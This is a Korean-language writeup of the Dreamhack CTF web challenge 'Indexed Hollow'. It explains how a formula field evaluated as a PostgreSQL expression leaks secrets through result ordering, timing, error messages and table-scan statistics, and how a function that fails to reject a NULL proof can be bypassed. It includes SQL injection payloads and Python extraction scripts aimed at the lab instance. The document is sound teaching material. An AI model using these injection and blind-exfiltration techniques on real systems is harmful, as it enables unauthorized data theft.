---
layout: post
title: Dreamhack Indexed Hollow wargame writeup
page_description: Web - Indexed Hollow
category_key: ctf-wargame
summary: Web - Indexed Hollow
lead: Web - Indexed Hollow
featured: false
feature_order: 0
---

# Indexed Hollow 상세 Writeup

## 0. 취약점 원리

### 1. 값을 반환하지 않아도 실행 결과는 관찰 가능

Indexed Hollow는 사용자가 보낸 `index.expr`를 PostgreSQL 표현식으로 평가한다. 일부 API는 계산값을 응답 본문에 직접 넣지 않지만, **계산값이 바꾼 결과**는 관찰할 수 있었다.

검색 API에서는 비밀 값에 따라 공개 행 네 개의 정렬 점수를 다르게 계산했다. 응답에 비밀 문자열은 없지만, `IH-001`~`IH-004`의 순서를 보면 그 값에 대응하는 순열을 알 수 있다. 수식 검사 API에서는 조건이 참일 때만 `pg_sleep`을 실행해 응답 시간 차이로 한 비트를 판별했다. 감사 API에서는 문자열을 정수로 변환할 때 발생한 오류가 원래 문자열을 `engine_error`에 포함했다.

내보내기 API는 수식을 바꿔도 같은 CSV를 반환했다. 그러나 수식이 테이블을 읽은 전후 `pg_stat_all_tables.seq_scan` 값이 증가했다. 비밀 숫자 `N`만큼 스캔을 반복하고, 감사 API에서 **요청 전후 스캔 횟수의 차이**를 읽으면 CSV가 고정되어 있어도 `N`을 알아낼 수 있다. `seq_scan`은 해당 테이블에서 시작된 순차 스캔 횟수다. [PostgreSQL 통계 문서](https://www.postgresql.org/docs/current/monitoring-stats.html)

따라서 이 문제의 첫 번째 원리는 **응답의 출력값을 가리는 것과 수식 실행 효과를 가리는 것은 다르다**는 점이다. 원본 대나무 테이블의 행 보안은 공개 행만 보여줬지만, 별도 테이블과 함수에서 발생한 정렬·시간·오류·통계 변화가 정보 전달 경로가 됐다. 행 보안의 적용 범위는 [PostgreSQL RLS 문서](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)를 참고할 수 있다.

### 2. `NULL`이 증명 검사의 거절 조건을 지나간다

보고서 함수 `worker_shadow.unseal_index(i,proof)`는 증명이 올바르지 않으면 `NULL`을 반환하도록 작성됐다. 복구한 함수의 핵심 검사는 다음과 같았다.

```plpgsql
IF proof !~ '^[0-9a-f]{64}$'
THEN RETURN NULL; END IF;

supplied := decode(proof, 'hex');
IF octet_length(supplied) <> 32
THEN RETURN NULL; END IF;

IF different <> 0
THEN RETURN NULL; END IF;
```

문제는 **`proof IS NULL`을 먼저 검사하지 않는 것**이다. `proof=NULL`이면 정규식 비교, 디코딩 결과의 길이 검사, 바이트 비교 결과가 차례로 `NULL`이 된다. PL/pgSQL의 `IF`는 조건이 `TRUE`일 때만 본문을 실행한다. 따라서 조건이 `NULL`인 위 거절 분기들은 `RETURN NULL`을 실행하지 않는다. [PostgreSQL PL/pgSQL 제어문 문서](https://www.postgresql.org/docs/current/plpgsql-control-structures.html)

실제 저장 보고서에서 `worker_shadow.unseal_index(0,NULL)`을 평가하자 암호문이 반환됐다.

```json
{"grove_code":"IH-001","sealed_index":"6a5c2d7c1cbc06c0"}
```

이 함수는 소유자 권한으로 실행되는 `SECURITY DEFINER` 함수였다. PostgreSQL 함수는 기본적으로 NULL 인자가 있어도 실행되며, `STRICT`로 선언하면 NULL 인자에 대해 본문을 실행하지 않는다. 이 문제에서는 함수가 실행된 뒤 검증 분기가 `NULL`을 거절하지 못해 비밀 암호문 반환 경로에 도달했다. [PostgreSQL `CREATE FUNCTION` 문서](https://www.postgresql.org/docs/current/sql-createfunction.html)

## 1. 결과와 풀이 개요

**플래그: `PD{...}`**

대상은 Dreamhack 웹 인스턴스 `http://host3.dreamhack.games:18061/`이다. 첫번째 인스턴스(`:17330`)에서 네 조각과 암호문을 찾았고, 두번째 인스턴스(`:18061`)에서 마지막 조각과 복호화 규칙을 복구했다. 이 글의 관측값은 해당 인스턴스의 실제 API 결과이며, 아래에는 요청식과 핵심 응답을 직접 적었다. 인스턴스가 종료되면 온라인 재현은 새 주소가 필요하지만 마지막 Python 코드는 복구된 값만으로 실행된다.

풀이의 핵심은 SQL 표현식을 평가하는 여러 API가 **서로 다른 관찰 채널**을 제공한다는 점이다. 원본 대나무 테이블은 행 보안으로 가려졌지만, 각 역할이 읽을 수 있는 별도의 capsule과 허용된 연산을 통해 다섯 개의 8바이트 조각을 얻었다. 보고서 작업자의 함수에서 암호문 여섯 조각을 얻고, 매니페스트의 키 생성 순서와 스트림 도메인으로 복호화했다.

여기서 *capsule*은 `archive_stage` 스키마의 테이블을 뜻한다. 각 테이블의 `payload`는 바이트열(`bytea`)이므로 `encode(payload,'hex')`로 사람이 읽을 수 있는 16진수를 만들거나 `get_byte(payload,n)`으로 `n`번째 바이트를 뽑는다[5]. R·T·C·A·E는 각각 독립적인 8바이트 조각이고, 보고서의 `sealed_index`는 복호화 전 암호문이다. 풀이 순서는 **입력 지점 확인 → 역할별 정보 누출 채널 확인 → 다섯 조각과 암호문 추출 → 매니페스트 복구 → 키 검증 및 복호화**다.

| 조각 | 접근 경로 | 관찰 채널 | 복구 값 |
|---|---|---|---|
| R | `/api/search` | 공개 행 네 개의 정렬 순서 | `50deff7918bca4b0` |
| T | `/api/formulas/check` | 응답 시간 | `66d4c1a740467822` |
| C | `/api/charts` | 집계 수치 | `3ff36382c845952e` |
| A | `/api/audit` | 오류 메시지 | `d7b8686a714cd93a` |
| E | `/api/export` | 테이블 스캔 통계 변화 | `0f66ebdf74e2fc0d` |

## 2. 입력 지점과 권한 경계

웹 화면의 `/static/app.js`는 검색, 수식 검사, 차트, 감사, 내보내기에 공통으로 `index.kind=formula`와 `index.expr`를 보냈다. 기본 요청 형태는 다음과 같다.

```http
POST /api/search HTTP/1.1
Content-Type: application/json

{"index":{"kind":"formula","expr":"quality_score"}}
```

`expr`는 제한된 산술식이 아니라 PostgreSQL 스칼라 표현식으로 실행됐다. 예를 들어 감사 API에서 `(SELECT 'HELLO')::integer`를 사용하면 핵심 응답은 다음과 같았다. 아래 JSON은 다른 필드를 생략하고 `engine_error`만 발췌한 것이다.

```json
{"engine_error":"invalid input syntax for type integer: \"HELLO\""}
```

이 실험에서 `(SELECT 'HELLO')`는 문자열을 만들고 `::integer`는 존재하지 않는 숫자로 변환을 시도한다. PostgreSQL이 변환 실패 메시지에 원문 `HELLO`를 넣고, 애플리케이션이 그 메시지를 `engine_error`에 옮겼다. 따라서 직접 출력되지 않는 텍스트도 이 채널에서는 짧게 확인할 수 있다. 반면 이 API에 없는 테이블 권한을 얻는 것은 아니므로, 먼저 어떤 역할이 어느 테이블을 읽을 수 있는지 조사해야 했다.

시스템 카탈로그의 `pg_class`에서 원본 `app.bamboo_groves`의 `relrowsecurity=true`, `relforcerowsecurity=true`를 확인했다. 원본을 직접 집계해도 `IH-001`부터 `IH-004`까지 공개 행 네 개만 보였다. 따라서 숨은 행을 직접 `SELECT`하는 가설을 버리고, 각 API의 실행 역할에 허용된 별도 테이블과 출력 형식을 조사했다. PostgreSQL RLS는 정책이 허용한 행만 조회 결과에 남긴다[1]. `pg_class.relacl`과 `pg_has_table_privilege`로 확인했을 때 `export_capsule`과 `worker_manifest`의 `SELECT`는 `analytics_reader` 역할에 있었고 감사 역할에는 없었다.

## 3. 첫 네 조각: 값이 아닌 결과 형태를 읽기

### 3.1 검색 결과의 순서에서 R 추출

검색 수식의 평가값 자체는 JSON에 나오지 않았지만 그 값으로 공개 행 네 개가 정렬됐다. 네 행의 순열은 24가지다. 이 중 16가지를 16진수 한 자리씩에 할당했다. 대상 테이블의 `grove_code`는 `IH-001`부터 `IH-004`까지라서 마지막 숫자로 행을 식별할 수 있었다.

```sql
substr(
  ranks,
  4 * (strpos('0123456789abcdef',
       substr(encode((SELECT payload FROM archive_stage.route_capsule),'hex'), i, 1)) - 1)
    + right(grove_code,1)::int,
  1
)::int
```

`ranks`는 16가지 순열을 표현하는 점수 문자열이다. `i`를 1부터 16까지 바꿔 요청하고, 응답의 `rows[*].grove_code` 순서를 해당 순열에 역매핑했다. 결과는 **`R = 50deff7918bca4b0`**였다. 검산용 전체 값 비교에서 참 분기는 `IH-001, IH-002, IH-003, IH-004`, 거짓 분기는 `IH-004, IH-003, IH-002, IH-001` 순서였다. 아래 재현 코드의 `perms`와 `ranks` 생성 방식이 이 SQL의 빈자리를 채운다.

수식 내부를 차례로 보면 `SELECT payload`가 8바이트를 가져오고, `encode(...,'hex')`가 16글자 문자열로 바꾼다. `substr(...,i,1)`은 그중 한 글자다. `strpos('0123456789abcdef',글자)`는 그 글자의 위치를 1~16으로 반환한다. 여기에 해당하는 `ranks`의 네 자리 묶음을 선택하고, `right(grove_code,1)`로 **현재 행**의 점수를 고른다. 즉 비밀 한 글자는 응답에 직접 나타나지 않고 네 공개 행의 정렬 순서로 변환된다. 네 행을 독립적으로 정렬할 수 있으므로 16개 후보를 서로 다른 순열로 표현할 수 있었다.

### 3.2 수식 검사 응답 시간에서 T 추출

`/api/formulas/check`는 평가 결과 대신 동일한 응답 `{"state":"checked"}`를 보냈다. 그러나 식에 따라 응답 시간이 달랐다.

```sql
CASE WHEN
  (get_byte((SELECT payload FROM archive_stage.clock_capsule), offset) & mask) <> 0
THEN pg_sleep(10) ELSE pg_sleep(0) END
```

`offset=0..7`, `mask=128,64,32,16,8,4,2,1`을 대입해 총 64비트를 판별했다. 빠른 분기는 약 0.23~0.38초, 느린 분기는 약 0.98~1.13초였다. `pg_sleep(10)`의 10초가 그대로 흐른 것은 아니다. 이 차이가 문장 제한 시간에 따른 것이라는 해석은 시간 분포에 근거하며, 경계에 가까운 측정은 재요청했다. 결과는 **`T = 66d4c1a740467822`**였다. 전체 payload와 이 값의 일치 여부를 한 번에 비교한 식도 느린 분기로 나와 재검증했다.

`get_byte(payload,offset)`은 0부터 시작하는 바이트 하나를 0~255의 정수로 만든다. `& mask`는 그 바이트와 특정 비트만 남긴다. 결과가 0이 아니면 비트가 1이므로 지연 분기로 가고, 0이면 지연이 없는 분기로 간다. 예를 들어 첫 바이트 `0x66`은 이진수 `01100110`이므로 128·16·8·1의 검사는 빠르고 64·32·4·2의 검사는 느려야 한다. 실제 8회 결과를 이 방식으로 합쳐 `0x66`을 얻었다. 시간은 네트워크 상태의 영향도 받으므로 단일 측정값이 아니라 두 군집과 재검증 결과를 함께 근거로 삼았다.

### 3.3 차트 집계 수치에서 C 추출

차트 역할은 `archive_stage.chart_shards(position,token)`과 `archive_stage.fold_chart` 집계를 호출할 수 있었다. 수식은 다음과 같다.

```sql
(SELECT archive_stage.fold_chart(position, token)
   FROM archive_stage.chart_shards)
```

실제 차트 응답의 핵심 수치는 `avg_index = 4608136257087051054`였다. 이 64비트 정수의 16진수 표기가 **`C = 3ff36382c845952e`**다. `pg_proc.prosrc`의 `chart_fold_final` 정의를 읽어 shard를 검사한 다음 보호된 `chart_capsule` 값을 숫자로 반환하는 동작도 확인했다.

여기서 `fold_chart(position,token)`은 일반적인 사용자 작성 함수가 아니라 데이터베이스에 정의된 집계다. `chart_shards`의 각 행을 집계 함수에 넣고 최종 단계인 `chart_fold_final`에서 결과를 얻는다. 차트 API는 그 결과를 `avg_index`로 직렬화했으므로, 단순히 10진 정수를 16진수로 변환하면 8바이트 조각이 된다. `4608136257087051054 = 0x3ff36382c845952e`라는 변환 자체는 오프라인에서 검산할 수 있다.

### 3.4 감사 오류에서 A 추출

감사 API는 평가 실패 내용을 `engine_error`에 남겼다. `audit_capsule.payload`를 16진수 텍스트로 만든 뒤 정수 변환을 강제했다. 요청 JSON에는 `query:"harvest"`도 넣었다.

```sql
(SELECT encode(payload,'hex')
   FROM archive_stage.audit_capsule LIMIT 1)::integer
```

응답에서 직접 읽은 핵심 필드는 다음과 같다.

```json
{"engine_error":"invalid input syntax for type integer: \"d7b8686a714cd93a\""}
```

따라서 **`A = d7b8686a714cd93a`**다. 동일한 오류 채널로 함수 소스도 읽었다. 오류 길이가 제한되어 있으므로 `start`를 바꿔 110글자씩 조회했다.

```sql
(SELECT substr(prosrc, start, 110)
   FROM pg_proc
  WHERE proname='unseal_index'
    AND pronamespace=(SELECT oid FROM pg_namespace
                       WHERE nspname='worker_shadow'))::integer
```

첫 식에서는 `encode(payload,'hex')`가 비밀 바이트를 문자열로 만든다. 16진수 문자 중 `a`~`f`가 포함된 이 문자열은 10진 정수가 아니므로 `::integer`에서 오류가 나고 문자열이 오류에 포함된다. 두 번째 식은 같은 원리를 함수 소스에 적용한다. `pg_proc.prosrc`에서 `unseal_index`의 본문을 가져오고[6], `substr(prosrc,start,110)`으로 오류 메시지의 길이 제한 안에 들어갈 부분만 잘라 읽는다. `start`를 1, 111, 221처럼 옮기면 원래 본문을 이어 붙일 수 있다.

## 4. 보고서 작업자의 NULL 증명 우회와 암호문

저장 보고서는 다음 정의로 생성하고 `report_id`를 `/api/reports/run`에 전달했다. 이어 `GET /api/reports/{report_id}/runs/{run_id}`에서 수식 평가값을 `artifact.rows[*].sealed_index`로 받았다.

```json
{"name":"probe","definition":{"version":1,
 "index":{"kind":"formula","expr":"worker_shadow.unseal_index(0,NULL)"}}}
```

카탈로그에서 복구한 `worker_shadow.unseal_index(i,proof)`는 보고서 작업자 역할, 서명된 실행 문맥, `report_runs.state='running'`을 확인했다. 이후 `vault.seal_control.unlock_key`로 HMAC을 계산해 `proof`와 비교하고 `vault.secret_chunks[i].ciphertext`를 반환했다. 핵심 취약 부분은 아래와 같다. 이 부분은 전체 함수가 아니라 증명 검증 구간의 발췌다.

```plpgsql
IF session_user <> 'report_worker_...'
   OR i < 0 OR i > 15 OR proof !~ '^[0-9a-f]{64}$'
THEN RETURN NULL; END IF;

supplied := decode(proof, 'hex');
IF octet_length(supplied) <> 32 THEN RETURN NULL; END IF;
FOR n IN 0..31 LOOP
  different := different | (get_byte(expected,n) # get_byte(supplied,n));
END LOOP;
IF different <> 0 THEN RETURN NULL; END IF;
```

이 코드의 의도는 `proof`가 64자리 소문자 16진수인지 검사하고, 32바이트로 디코딩한 다음 기대 HMAC과 모든 바이트를 비교하는 것이다. `different`는 바이트별 XOR 결과를 비트 OR로 누적한다. 하나라도 다르면 0이 아닌 값이 되어 마지막 `IF`에서 거절된다. 그런데 `proof IS NULL`을 먼저 거절하지 않는다. 세 값 논리에서 `NULL !~ 패턴`은 참이나 거짓이 아닌 `NULL`이고, `FALSE OR NULL` 역시 `NULL`이다. 이후 `decode(NULL,'hex')`, `octet_length(NULL)` 및 `get_byte(NULL,n)`도 `NULL`로 이어져 `different`가 `NULL`이 된다. 따라서 모든 거절용 `IF` 조건이 참이 아니게 된다.

`proof=NULL`이면 정규식 비교, `decode`, 길이 검사, 바이트 비교의 결과가 `NULL`로 전파된다. PL/pgSQL의 `IF`는 조건이 참일 때만 분기를 실행하므로, `NULL` 조건은 `RETURN NULL`을 실행하지 않는다[2]. 보고서 작업자 및 서명된 문맥 검사는 정상적인 보고서 실행으로 만족됐다. 첫 응답에서 확인한 행은 다음과 같다.

```json
{"grove_code":"IH-001","region":"North Terrace","sealed_index":"6a5c2d7c1cbc06c0","species":"Phyllostachys edulis"}
```

다음 수식으로 `i=0..15`를 한 번에 조사했다.

```sql
(SELECT json_agg(json_build_array(i,worker_shadow.unseal_index(i,NULL)) ORDER BY i)::text
   FROM generate_series(0,15) AS g(i))
```

`generate_series(0,15)`가 인덱스 16개를 만들고 각 인덱스마다 함수를 한 번 호출한다. `json_build_array(i,값)`은 인덱스와 결과를 한 쌍으로 묶고, `json_agg(... ORDER BY i)`는 순서대로 하나의 결과로 합친다. 보고서의 공개 행마다 같은 집계 결과가 계산되더라도 인덱스별 암호문을 한 번에 확인할 수 있다. 값이 없던 6~15번은 다음 표에서 생략했다.

값이 있는 인덱스는 0~5뿐이며 총 길이는 42바이트였다.

| 인덱스 | `sealed_index` 암호문 |
|---:|---|
| 0 | `6a5c2d7c1cbc06c0` |
| 1 | `d53202a6ac059b71` |
| 2 | `d5c070c6c060ba65` |
| 3 | `948764eedefc8d02` |
| 4 | `56aa1f21f9d833b7` |
| 5 | `ea66` |

이 시점에서는 **암호문만 얻은 상태**다. 42바이트를 그대로 평문으로 해석하지 않고 해제 키와 스트림 규칙을 따로 찾았다.

## 5. 고정 CSV 뒤에 남는 통계: E와 매니페스트

`/api/export`에 정상 수식, `1/0`, 없는 필드를 넣어도 285바이트의 동일한 공개 CSV가 왔다. 실제 본문은 다음과 같다.

```csv
grove_code,name,region,species,index_band
IH-001,Verdant Meridian,North Terrace,Phyllostachys edulis,prime
IH-002,Quiet Lantern,East Basin,Bambusa oldhamii,select
IH-003,Moss Circuit,South Hollow,Dendrocalamus asper,standard
IH-004,Index Reed,West Gallery,Phyllostachys nigra,standard
```

처음에는 입력식이 평가되지 않는다고 가정했지만, 테이블 통계로 반증했다. `export_capsule`을 읽은 전후 `pg_stat_all_tables.seq_scan`이 `1:1 → 2:2`로 변했다. `worker_manifest`를 한 번 읽으면 `1:0 → 2:22`, 세 번 읽으면 `2:22 → 5:88`로 변했다. 각 표기는 `seq_scan:seq_tup_read`이며 `seq_scan`은 그 테이블에서 시작한 순차 스캔 횟수다[3]. CSV에 평가값이 안 실릴 뿐 식은 실행됐다.

감사 역할은 export용 capsule을 읽을 권한이 없지만 통계 뷰와 오류 채널은 사용할 수 있었다. 다음 식을 감사 API에 보내면 `engine_error` 안에 스캔 횟수가 남는다.

```sql
(SELECT 'S=' || seq_scan || ':' || seq_tup_read
   FROM pg_stat_all_tables
  WHERE schemaname='archive_stage' AND relname='worker_manifest')::integer
```

위 세 번 스캔한 뒤 오류의 핵심 내용은 다음과 같았다.

```json
{"engine_error":"invalid input syntax for type integer: \"S=5:88\""}
```

이제 읽고 싶은 한 바이트를 정수 `N`으로 만든 다음 다른 테이블을 `N`회 스캔한다. 아래 식은 `export_capsule.payload`의 첫 바이트를 읽는다. `manifest_key`와 숫자 문자열 `g::text`의 비교가 외부 변수에 의존하므로 반복 스캔이 발생한다. 요청 전후 `worker_manifest.seq_scan`의 차이가 바이트 값이다.

```sql
(SELECT sum((SELECT count(*)
               FROM archive_stage.worker_manifest AS m
              WHERE m.manifest_key <> g::text))
   FROM generate_series(1,
        get_byte((SELECT payload FROM archive_stage.export_capsule),0)) AS g)
```

이 식을 안쪽부터 보면 `get_byte(...,0)`이 비밀 첫 바이트를 `N`으로 만든다. `generate_series(1,N)`은 N개의 행을 만든다. 각 `g`에 대해 `worker_manifest`의 `count(*)` 서브쿼리가 실행되도록 `m.manifest_key <> g::text`라는 외부 변수 의존 조건을 넣었다. `sum(...)`은 반복 결과를 하나의 스칼라 값으로 합치지만, 이 값 자체는 고정 CSV 때문에 보이지 않는다. 대신 같은 테이블의 요청 전후 `seq_scan` 차이를 감사 API에서 읽는다. 예를 들어 차이가 15라면 첫 바이트는 `0x0f`다. 이 관계는 실제 1회·3회 스캔 실험으로 먼저 확인했으며, 스캔 횟수는 계획이나 통계 반영 시점의 영향을 받을 수 있어 전후 차이를 직접 확인했다.

offset 0~7의 결과는 `0f 66 eb df 74 e2 fc 0d`, 즉 **`E = 0f66ebdf74e2fc0d`**였다.

같은 기법을 반대로 써서 `worker_manifest`의 문자열을 읽었다. 이때 1행짜리 `export_capsule`을 반복 스캔하는 표식 테이블로 사용했다. 인쇄 가능 ASCII 세 글자를 `(c0-32)×95²+(c1-32)×95+(c2-32)`로 묶으면 최댓값이 857374여서 한 통계 차이로 세 글자를 회수할 수 있다. 아래 코드는 길이를 먼저 읽고 세 글자씩 복구한다. 필요한 매니페스트 값은 다음과 같았다.

```text
ciphertext_encoding=lowercase-hex
ciphertext_join=colon,index-ascending
share_order=R,T,C,A,E
share_sizes=8,8,8,8,8
share_text_encoding=lowercase-hex
unlock_domain_hex=496e646578656420486f6c6c6f77207365616c20763300
unlock_hash=sha256
stream_domain_hex=666c61672d73747265616d00
```

두 도메인의 16진수를 디코딩하면 각각 `Indexed Hollow seal v3\0`, `flag-stream\0`이다.

매니페스트 복구에서는 `string_agg(... ORDER BY manifest_key)`로 행들을 일정한 순서의 긴 문자열로 만들었다. 먼저 `length(...)`를 같은 스캔 횟수 채널로 읽고, 이후 `substr`로 세 글자씩 잘랐다. 한 글자의 인쇄 가능 ASCII 범위 32~126을 0~94로 옮겨 95진수 세 자리로 합친 것이다. 읽은 횟수 `N`에서 첫 글자는 `N//9025+32`, 둘째는 `(N//95)%95+32`, 셋째는 `N%95+32`로 복원한다. 문자열 마지막에서 세 글자를 채우지 못하면 공백(ASCII 32)으로 채우고 원래 길이로 자른다. 이렇게 복구한 매니페스트가 조각 순서와 키·스트림 도메인을 지정했다.

## 6. 키 검증과 플래그 복구

매니페스트의 `share_order`에 따라 다섯 조각을 `R,T,C,A,E` 순서로 둔다. 각 16진수 **텍스트**가 아니라 8바이트 **원시 값**으로 바꿔 이어 붙이고, 앞에 unlock 도메인을 붙여 SHA-256을 계산한다.

```text
K = SHA256(bytes.fromhex(unlock_domain_hex) || R || T || C || A || E)
  = 55d9d088d01da797b665993a481e07c28c58758446f4c7abdd77b023ca6a939a
```

키가 맞는지 서버에서도 확인했다. 복구한 함수 소스에서 증명 메시지는 `report-proof\0`, `session_user`와 `current_user`의 2바이트 길이 접두 UTF-8 문자열, `report_id`와 `run_id`의 UUID 바이트, 4바이트 인덱스 순으로 만들어졌다. 이 메시지에 대해 위 K로 HMAC-SHA256을 계산해 `worker_shadow.unseal_index(0,proof)`에 넣었다. 새 인스턴스의 역할명은 `report_worker_f362e6cfdad09ff0`, 함수 소유자는 `app_owner_3633d8e34e667402`였다. **정상 증명으로도** `sealed_index=6a5c2d7c1cbc06c0`이 반환됐다. 이는 키 도출식의 독립적인 검증이다. HMAC 함수의 동작은 PostgreSQL `pgcrypto` 문서[4]와 일치한다.

여기서 2바이트 길이 접두사는 역할명의 바이트 길이를 big-endian으로 앞에 기록한 것이다. UUID는 텍스트의 하이픈을 포함한 문자열이 아니라 `uuid_send`가 만드는 16바이트 값이다. 인덱스 역시 문자열 `"0"`이 아니라 `int4send(0)`의 4바이트 값이다. 한 구성 요소라도 다르면 HMAC이 달라져 정상 증명 검사가 통과하지 않는다. `NULL` 우회와 별도로 이 검사를 한 이유는 다섯 조각의 순서 및 키 도출식이 맞는지 서버를 상대로 확인하기 위해서다.

암호문 조각 `C_i`의 스트림은 매니페스트의 `stream_domain_hex`를 사용한다. 인덱스 `i`는 0부터 시작하고 `int4be(i)`는 4바이트 big-endian 정수다. 아래 식은 매니페스트 값에서 구성한 후보이며, 여섯 조각 전체가 출력 가능한 ASCII로 연결되고 정확히 `PD{...}` 형식이 되는지 검산했다.

```text
P_i = C_i XOR HMAC-SHA256(K, b"flag-stream\0" || int4be(i))[:len(C_i)]

P_0 = PD{...
P_1 = I...
P_2 = B...
P_3 = v...
P_4 = 3...
P_5 = 5}
```

HMAC-SHA256은 각 인덱스마다 32바이트를 출력한다. 이 문제의 암호문 조각은 처음 다섯 개가 8바이트, 마지막이 2바이트라서 각 HMAC 출력의 앞 8바이트 또는 2바이트만 XOR에 쓴다. 예를 들어 `P_0`은 첫 암호문 `6a5c2d7c1cbc06c0`과 인덱스 0용 스트림 앞 8바이트를 바이트별 XOR한 결과다. 인덱스를 메시지에 넣기 때문에 조각마다 서로 다른 스트림을 사용한다. 여섯 결과가 함께 `PD{...}` 형식이 된 것은 스트림 식을 채택한 검산 근거이며, 서버의 정상 증명 성공은 키 계산의 별도 검산 근거다.

따라서 **`PD{...}`**이다. 아래 Python 코드는 입력값, 키 계산, 여섯 조각 복호화, 형식 검사를 한 파일에서 실행한다.

## 7. 재현 코드

다음 코드 블록은 실제 사용한 파일 내용을 본문에 직접 포함한 것이다. 온라인 코드의 `IH_BASE_URL`을 현재 인스턴스 주소로 바꾸면 된다. 인스턴스별 역할 접미사가 다른 증명 검산은 위 설명대로 역할명을 새 값에 맞춰야 한다.

### 7.1. 정렬 순서로 R 추출 (`verify_route.py`)

```python
import http.cookiejar
import itertools
import json
import os
import urllib.request

BASE = os.environ.get("IH_BASE_URL", "http://host3.dreamhack.games:18061").rstrip("/")
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
with opener.open(BASE + "/", timeout=10):
    pass

perms = ["".join(p) for p in itertools.islice(itertools.permutations("1234"), 16)]
ranks = "".join("".join(str(4 - p.index(c)) for c in "1234") for p in perms)
result = ""
for i in range(1, 17):
    expr = (
        f"substr('{ranks}',4*(strpos('0123456789abcdef',"
        f"substr(encode((SELECT payload FROM archive_stage.route_capsule),'hex'),{i},1))-1)"
        "+right(grove_code,1)::int,1)::int"
    )
    request = urllib.request.Request(
        BASE + "/api/search",
        data=json.dumps({"index": {"kind": "formula", "expr": expr}}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with opener.open(request, timeout=10) as response:
        body = json.load(response)
    order = "".join(row["grove_code"][-1] for row in body["rows"])
    result += format(perms.index(order), "x")
print(result)
```

**코드 해설** `BASE`는 접속 주소이며 `IH_BASE_URL` 환경 변수로 새 인스턴스를 지정할 수 있다. `HTTPCookieProcessor`는 첫 페이지 접속에서 받은 세션 쿠키를 뒤이은 API 요청에 유지한다. `itertools.permutations("1234")`가 네 공개 행의 가능한 순서를 만들고 `islice(...,16)`이 그중 16개만 골라 16진수 `0`~`f`에 대응시킨다.

`ranks`는 각 순열에 대해 네 행의 정렬 점수를 이어 붙인 문자열이다. 예를 들어 첫 순열 `1234`의 점수는 `4321`이다. 수식에는 이 전체 문자열을 넣되, 비밀 16진수 한 글자가 가리키는 네 자리 묶음만 `substr`로 선택한다. `for i in range(1,17)`은 8바이트를 16진수로 나타낸 16글자를 순서대로 읽는다. `json.dumps`가 검색 요청의 수식을 JSON으로 직렬화하고, 응답의 `grove_code` 마지막 글자를 모으면 실제 정렬 순서가 된다. `perms.index(order)`가 그 순서를 0~15로 되돌리고 `format(...,'x')`가 한 자리 16진수로 만든다. 루프 끝의 `result`가 R 전체다.

### 7.2. 응답 시간으로 T 추출 (`verify_clock.py`)

```python
import http.cookiejar
import json
import os
import time
import urllib.request

BASE = os.environ.get("IH_BASE_URL", "http://host3.dreamhack.games:18061").rstrip("/")
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
with opener.open(BASE + "/", timeout=10):
    pass


def check(expression):
    request = urllib.request.Request(
        BASE + "/api/formulas/check",
        data=json.dumps({"index": {"kind": "formula", "expr": expression}}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    start = time.perf_counter()
    with opener.open(request, timeout=20) as response:
        response.read()
    return time.perf_counter() - start


payload = bytearray()
for offset in range(8):
    value = 0
    times = []
    for bit in range(8):
        mask = 128 >> bit
        expr = (
            "CASE WHEN (get_byte((SELECT payload FROM archive_stage.clock_capsule),"
            f"{offset})&{mask})<>0 THEN pg_sleep(10) ELSE pg_sleep(0) END"
        )
        duration = check(expr)
        if 0.55 < duration < 0.8:
            duration = check(expr)
        if duration > 0.7:
            value |= mask
        times.append(round(duration, 3))
    payload.append(value)
    print(f"{offset}: {value:02x} {times}", flush=True)
print("hex:", payload.hex())
```

**코드 해설** `check()`는 수식 검사 API에 한 조건식을 보내고 `time.perf_counter()`의 전후 차이만 반환한다. 결과 본문을 사용하지 않는 이유는 참·거짓 두 경우 모두 `checked`이기 때문이다. 바깥 반복의 `offset`은 바이트 위치 0~7, 안쪽 반복의 `bit`는 그 바이트에서 검사할 비트 위치 0~7이다. `128 >> bit`는 `10000000₂`부터 `00000001₂`까지 한 비트짜리 마스크를 순서대로 만든다.

`expr`의 `CASE`는 해당 비트가 1이면 지연을 만들고 0이면 바로 끝난다. 측정값이 0.55~0.8초로 두 군집 사이에 걸리면 재요청한다. 나머지는 관측된 군집 사이의 기준인 0.7초로 분류해, 느리면 `value |= mask`로 해당 비트를 켠다. 8비트를 합친 `value`를 `payload`에 추가하면 원래 바이트 순서가 유지된다. 각 줄에 출력하는 시간 목록은 판정 오류를 눈으로 점검하기 위한 것이고 마지막 `payload.hex()`가 T 전체다. 이 임계값은 이 인스턴스에서 측정한 시간대에 맞춘 것이므로, 새 인스턴스에서는 먼저 빠른·느린 대조군의 시간을 재야 한다.

### 7.3. 스캔 횟수로 E 및 매니페스트 추출 (`stat_exfil.py`, `read_manifest.py`)

```python
import http.cookiejar
import json
import os
import re
import sys
import urllib.request

BASE=os.environ.get('IH_BASE_URL','http://host3.dreamhack.games:18061').rstrip('/')
opener=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
opener.open(BASE+'/',timeout=10).read()


def post(route,expression):
    body={'index':{'kind':'formula','expr':expression}}
    if route=='audit':
        body['query']='harvest'
    request=urllib.request.Request(BASE+'/api/'+route,data=json.dumps(body).encode(),headers={'Content-Type':'application/json'},method='POST')
    with opener.open(request,timeout=20) as response:
        result=response.read().decode()
    return json.loads(result) if route=='audit' else result


def stat(table):
    expr=f"(SELECT 'S='||seq_scan FROM pg_stat_all_tables WHERE schemaname='archive_stage' AND relname='{table}')::integer"
    result=post('audit',expr)
    error=result.get('engine_error','')
    match=re.search(r'S=(\d+)',error)
    if not match:
        raise RuntimeError(error)
    return int(match.group(1))


def leak_number(value_sql,marker):
    before=stat(marker)
    expr=f"(SELECT sum((SELECT count(*) FROM archive_stage.{marker} m WHERE m.{('manifest_key' if marker=='worker_manifest' else 'payload::text')}<>g::text)) FROM generate_series(1,{value_sql}) g)"
    post('export',expr)
    after=stat(marker)
    return after-before


if __name__=='__main__':
    data=[]
    for i in range(8):
        value=leak_number(f'get_byte((SELECT payload FROM archive_stage.export_capsule),{i})','worker_manifest')
        if not 0<=value<=255:
            raise RuntimeError(f'bad byte {i}: {value}')
        data.append(value)
        print(i,f'{value:02x}',flush=True)
    print('export capsule:',bytes(data).hex())
```

